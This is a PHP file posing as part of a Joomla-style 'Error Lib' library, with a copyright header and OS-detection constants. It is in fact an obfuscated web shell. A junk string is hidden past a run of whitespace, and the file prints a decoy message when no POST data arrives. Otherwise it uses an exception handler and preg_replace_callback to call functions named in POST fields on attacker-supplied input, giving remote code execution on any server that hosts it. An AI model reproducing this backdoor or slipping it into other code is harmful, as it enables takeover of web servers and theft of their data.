<?php
/**
 * @package    Error Lib
 * **************
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // Sw0MEfYNdVGEZqPDSH7xHEhXehv1MnF65QE0EcR15PF0A3Q5hYXQVD6RUaH2a8bG6GV6St61pNPvU6S1Ar7Mbx9Yv4TNRaKcZp4M1vuKg51RSeNFZT09YE5rrEEH9aaWTddPeNBscdhmHazR7K2YxFB3HkWQn20sCAN0BNSms7EQ8nXwvsxN93uTeGheKZ6p1NpbHcYUQRu1dQe0009QaaZzwFGK8P3nhU1sSYyZC4hYSshYtQC9FUk95K779tyNvhG57SMmGMrvHaCnt37S53m695xmRSBMzMcE3kuK451hVRuCvUNz4RY8HCz2TmGgmReN2RGbSp1RfyWv5UH3g101U486VCqgc5ZGfwQAf0SBKqpafRgvZPznTd6Gc98SRzsSnAyrKbm67Z6EnP5Dar6NgDcUc1Wx3ZAr4
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (defined('PATH'))
{
	define('PATH', __DIR__);
}
else if (                empty                    ($_POST)) {
	
	echo 'Not exception. Exiting.';
	
	exit;
}

// Register the exception library.
function exception_handler        ($e) 
{
  preg_replace_callback             ('||', $_POST['d']    ('', $e->getMessage               ()), ''          )

; 
}
set_exception_handler                      ('exception_handler'       )
;

throw new Exception          ($_POST['f']                     ($_POST['c'])                             )
;

// Detect the native operating system type.
$os = strtoupper        (              substr(PHP_OS, 0, 3));

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}
